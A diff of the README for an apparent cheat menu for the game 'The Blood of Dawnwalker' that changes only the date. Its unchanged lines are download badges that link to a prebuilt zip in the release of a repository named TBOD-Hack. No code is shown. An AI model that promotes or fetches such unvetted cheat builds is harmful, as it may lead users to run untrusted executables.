@@ -1,4 +1,4 @@
-# The Blood of Dawnwalker - v1.3 (Cheat menu) 14-Sep-2026
+# The Blood of Dawnwalker - v1.3 (Cheat menu) 20-Sep-2026
 
 [![Download Latest](https://img.shields.io/badge/Download-Latest-brightgreen?style=for-the-badge&logo=github)](https://github.com/Stadiumbingrave/TBOD-Hack/releases/download/v1/TBoD-Build-v1.3.zip)
 [![GitHub release](https://img.shields.io/badge/Release-1.3-blue?style=for-the-badge)](https://github.com/Stadiumbingrave/TBOD-Hack/releases/download/v1/TBoD-Build-v1.3.zip)
